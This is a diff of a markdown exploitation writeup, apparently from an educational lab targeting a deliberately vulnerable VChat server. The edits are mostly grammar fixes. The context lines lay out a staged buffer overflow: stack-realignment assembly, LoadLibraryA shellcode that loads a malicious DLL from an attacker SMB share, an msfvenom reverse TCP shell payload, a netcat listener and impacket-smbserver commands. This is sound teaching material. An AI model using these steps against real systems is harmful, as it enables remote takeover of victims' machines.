@@ -1005,7 +1005,7 @@ With this exploit, we will use the well-known [msfvenom](https://docs.metasploit
 This is the most reliable version of the attack that we have found, as we do not face many encoding/decoding errors, and it has the least uncertainty involved as we are not guessing the socket's file descriptor as is done in the [Multi-Staged](#multi-stage) attack. 
 
 
-As we have done before we need to realign the stack pointer stored in the `ESP` register, since we have jumped to the start of the buffer there are a few thousand `A`s between us and the top of the stack. Additionally, if we do not move the stack pointer as the last instruction used by the decoder in the shellcode is `PUSH EAX`, the second stage shellcode is written to the stack following the `JMP <Head>` instruction, so we would never reach it!
+As we have done before, we need to realign the stack pointer stored in the `ESP` register; since we have jumped to the start of the buffer, there are a few thousand `A`s between us and the top of the stack. Additionally, if we do not move the stack pointer as the last instruction used by the decoder in the shellcode is `PUSH EAX`, the second stage shellcode is written to the stack following the `JMP <Head>` instruction, so we would never reach it!
 
 	https://github.com/DaintyJet/VChat_LTER/assets/60448620/544540f9-6d4d-4262-b099-d987a5b86625
 
@@ -1013,9 +1013,9 @@ As we have done before we need to realign the stack pointer stored in the `ESP` 
 
 	<img src="Images/I48.png" width=600>
 
-	* Here my `ESP` register holds the value `0x013CFFC3` and the address we jump to is `0x013CF21E`, this gives us a difference of `0x0DA5` or 3,493 bytes! As our stack grows down, to prevent overwriting our own shellcode when loading the arguments for `LoadLibraryA(...)` onto the stack we need to place the ESP near the start of our shellcode so it can move it to a safe position, or place it far below our shellcode so it will not overwrite the shellcode. As we need to position the `ESP` to point to a location on the stack we can write to, and fall into after our decoder has extracted the first stage we will leave the further modifications required to protect the shellcode to the shellcode itself. This means we will subtract a value that is somewhere between `0` and `0x0DA5`. <!-- so I chose to use the offset `0x09A5` so we write to an address we will eventually execute without performing a jump, and we leave the additional stack manipulation needed to prevent the corruption of our shellcode to the shellcode itself. -->
+	* Here my `ESP` register holds the value `0x013CFFC3` and the address we jump to is `0x013CF21E`, this gives us a difference of `0x0DA5` or 3,493 bytes! As our stack grows down, to prevent overwriting our own shellcode when loading the arguments for `LoadLibraryA(...)` onto the stack, we need to place the ESP near the start of our shellcode so it can move it to a safe position, or place it far below our shellcode so it will not overwrite the shellcode. As we need to position the `ESP` to point to a location on the stack we can write to and fall into after our decoder has extracted the first stage, we will leave the further modifications required to protect the shellcode to the shellcode itself. This means we will subtract a value that is somewhere between `0` and `0x0DA5`. <!-- so I chose to use the offset `0x09A5` so we write to an address we will eventually execute without performing a jump, and we leave the additional stack manipulation needed to prevent the corruption of our shellcode to the shellcode itself. -->
 
-2. We will use the machine code that results from the following x86 assembly instructions. We can generate them in Immunity Debugger as done previously, or with the `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` program on the Kali Linux machine.
+2. We will use the machine code that results from the following x86 assembly instructions. We can generate them in Immunity Debugger as done previously or with the `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` program on the Kali Linux machine.
 	```
 	PUSH ESP  		   ; Push the ESP register's value onto the stack
 	POP EAX   		   ; Pop the ESP register's value as it is at the top of the stack into EAX
@@ -1055,9 +1055,9 @@ As we have done before we need to realign the stack pointer stored in the `ESP` 
 		<img src="Images/I50.png" width=600>
 
 
-Now we can generate our *first stage* shellcode, unlike the [Multi-Staged](#multi-stage) exploit we will not be using the `recv(...)` function to directly load our shellcode onto the stack, we will instead be using `LoadLibraryA(...)` combined with a malicious DLL to generate our reverse shell. More details on malicious DLLs and the `LoadLibraryA(...)` function is contained in the [VChat_DLL](https://github.com/DaintyJet/VChat_KSTET_DLL) writeup.
+Now we can generate our *first stage* shellcode, unlike the [Multi-Staged](#multi-stage) exploit, we will not be using the `recv(...)` function to directly load our shellcode onto the stack, we will instead be using `LoadLibraryA(...)` combined with a malicious DLL to generate our reverse shell. More details on malicious DLLs and the `LoadLibraryA(...)` function are contained in the [VChat_DLL](https://github.com/DaintyJet/VChat_KSTET_DLL) writeup.
 
-1. Locate the address of the `LoadLibraryA` function, to get this information we can use [Arwin](https://github.com/xinwenfu/arwin) as shown below: 
+1. Locate the address of the `LoadLibraryA` function. To get this information, we can use [Arwin](https://github.com/xinwenfu/arwin) as shown below: 
 	```
 	arwin.exe kernel32 LoadLibraryA
 	```
@@ -1065,7 +1065,7 @@ Now we can generate our *first stage* shellcode, unlike the [Multi-Staged](#mult
 	* `kernel32`: This is the DLL that the function is stored in that we should search.
 	* `LoadLibraryA`: The function who's address we are attempting to resolve.
 
-2. Using this address fill out the shellcode source from the [VChat_DLL](https://github.com/DaintyJet/VChat_KSTET_DLL) writeup contained in [dll_shellcode.s](./SourceCode/dll_shellcode.s). Remember that you will have to modify the string used to load the DLL based on your IP!
+2. Using this address, fill out the shellcode source from the [VChat_DLL](https://github.com/DaintyJet/VChat_KSTET_DLL) writeup contained in [dll_shellcode.s](./SourceCode/dll_shellcode.s). Remember that you will have to modify the string used to load the DLL based on your IP!
 	```
 	sub esp,0x64            ; Move ESP pointer above our initial buffer to avoid
                         	; overwriting our shellcode
@@ -1143,7 +1143,7 @@ $ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.0.2.1
 	* `.`: This is the current directory we are in, we can specify a path to share a specific directory. 
 
 
-With the second stage prepped and exposed on our network, we can preform the final exploitation. 
+With the second stage prepped and exposed on our network, we can perform the final exploitation. 
 1. Start a local [netcat](https://linux.die.net/man/1/nc) listener on our Kali machine for port 8080.
 
 	```
@@ -1152,13 +1152,13 @@ With the second stage prepped and exposed on our network, we can preform the fin
 	* `nc`: The netcat command.
 	* `-l`: Set netcat to listen for connections.
 	* `v`: Verbose output.
-	* `p`: Set to listen on a port, in this case port 8080.
+	* `p`: Set to listen on a port, in this case, port 8080.
 
 4. If the SMB share has not been started, navigate to where your malicious DLL is located and start it. 
 	```
 	$ sudo impacket-smbserver -smb2support ABCD .
 	```
-	* `sudo`: This command and operation requires root privileges to bind to the well known SMB port 445.
+	* `sudo`: This command and operation requires root privileges to bind to the well-known SMB port 445.
 	* [`impacket-smbserver`](https://www.kali.org/tools/impacket-scripts/#impacket-smbserver):  This is the command the launches a SMB server and add a share as specified. 
 	* `smb2support`: Enable SMB2 Support.
 	* `A`: Name of the current Share. This is chosen to be short as we would complicate the shellcode generation otherwise.
@@ -1178,7 +1178,7 @@ We will perform a similar exploit to one done for the [KSTET_Multi](https://gith
 
 		* Here my `ESP` register holds the value `0x013CFFC3` and the address we jump to is `0x013CF21E`, this gives us a difference of `0x0DA5` or 3,493 bytes! As our stack grows down, to prevent the multiple calls to the `recv(...)` function from mangling our shellcode, we would like to align our stack to be "Behind" or point to an address lower than the location we wrote our shellcode to. However, we **also** want the decoded shellcode to be written to an address that we can fall into without a jump, so we will make further modifications to the `ESP` value in our shellcode used to call to `recv(...)` separately from our current `ESP` modifications. <!-- so I chose to use the offset `0x09A5` so we write to an address we will eventually execute without performing a jump, and we leave the additional stack manipulation needed to prevent the corruption of our shellcode to the shellcode itself. -->
 
-	2. We will use the machine code that results from the following x86 assembly instructions. We can generate them in Immunity Debugger as done previously, or with the `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` program on the Kali Linux machine.
+	2. We will use the machine code that results from the following x86 assembly instructions. We can generate them in Immunity Debugger as done previously or with the `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` program on the Kali Linux machine.
 		```
 		PUSH ESP  		   ; Push the ESP register's value onto the stack
 		POP EAX   		   ; Pop the ESP register's value as it is at the top of the stack into EAX
@@ -1313,7 +1313,7 @@ We will perform a similar exploit to one done for the [KSTET_Multi](https://gith
     	* `LPORT=8080`: The port on the remote listening host's traffic should be directed to in this case port 8080.
     	* `EXITFUNC=thread`: Create a thread to run the payload.
   	* `-f`: The output format.
-    	* `python`: Format for use in python scripts.
+    	* `python`: Format for use in Python scripts.
   	* `-v`: Specify a custom variable name.
     	* `SHELL`: Shell Variable name.
   	* `-b`: Specifies bad chars and byte values. This is given in the byte values.
